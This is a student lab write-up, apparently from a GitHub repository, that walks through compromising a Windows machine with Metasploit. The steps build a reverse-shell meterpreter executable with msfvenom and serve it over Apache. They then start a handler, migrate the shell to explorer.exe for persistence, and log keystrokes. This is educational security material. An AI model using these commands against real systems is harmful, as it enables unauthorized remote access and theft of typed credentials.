# Compromising-windows-using-Metasploit
Compromising windows using Metasploit
# Metasploit
Compromising windows using Metasploit
Developed By 
MURALIDHARAN M 
212223040120
# AIM:

To Compromise windows using Metasploit .

## DESIGN STEPS:

### Step 1:

Install kali linux either in partition or virtual box or in live mode

### Step 2:

Investigate on the various categories of tools as follows:

### Step 3:

Open terminal and try execute some kali linux commands

## EXECUTION STEPS AND ITS OUTPUT:

## PROGRAM:
Find the attackers ip address using ifconfig
## Output :
![image](https://github.com/user-attachments/assets/f199d9df-8df9-4a0b-9d1a-adebdb8ee48d)

Create a malicious executable file fun.exe using msenom command  msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.2 -f exe > fun.exe

## Output:
![image](https://github.com/user-attachments/assets/0060ba60-29b6-4568-806f-20270c236ad2)
copy the fun.exe into the apache /var/www/html folder

![image](https://github.com/user-attachments/assets/02aa7dc5-93ca-4ad7-9636-8b9c5ba0070d)

Start apache server sudo systemctl apache2 start

![image](https://github.com/user-attachments/assets/ac415d4c-f5db-4c90-8d97-4a03c0186f28)

Check the status of apache2 sudo apache2 status

![image](https://github.com/user-attachments/assets/a63c096c-cbc2-4341-880a-42e5c414fba7)

Invoke msfconsole:

Type help or a question mark "?" to see the list of all available commands you can use inside msfconsole.

Starting a command and control Server use multi/handler set PAYLOAD windows/meterpreter/reverse_tcp set LHOST 0.0.0.0 exploit

## Output:
![image](https://github.com/user-attachments/assets/13c92553-f5aa-4589-ba1b-b7115e906231)

On the target Windows machine, open a Web browser and open this URL, replacing the IP address with the IP address of your Kali machine: http://192.168.1.2/fun.exe The file "fun.exe" downloads.

![image](https://github.com/user-attachments/assets/0b69010f-d3f4-4e11-9eb8-27f09a95b4a4)

Bypass any warning boxes, double-click the file, and allow it to run. On kali give the command exploit

![image](https://github.com/user-attachments/assets/1685b62e-8e72-49a6-81cb-6add018438ed)

To see a list of processes, at the meterpreter > prompt, execute this command: ps ⇒ can see the fun.exe process running with pid 1156

The Metasploit shell is running inside the "fun.exe" process. If the user closes that process, or logs off, the connection will be lost. To become more persistent, we'll migrate to a process that will last longer. Let's migrate to the winlogon process. At the meterpreter > prompt, execute this command:

migrate -N explorer.exe at meterpreter > prompt, execute this command: netstat A list of network connections appears, including one to a remote port of 4444, as highlighted in the image below. Notice the "PID/Program name" value for this connection, which is redacted

## Post Exploitation:
The target is now owned. Following are meterpreter commands for key capturing in the target machine keyscan_start Begins capturing keys typed in the target. On the Windows target, open Notepad and type in some text, such as your name.

![image](https://github.com/user-attachments/assets/2c800741-e5b4-4fc0-8f2b-2aa392ec6623)

keyscan_dump Shows the keystrokes captured so far

![image](https://github.com/user-attachments/assets/e2717fa5-0e2a-45ec-aa3d-dd2ceb91860c)


## RESULT:
The Metasploit framework is  used to compromise windows and is examined successfully.
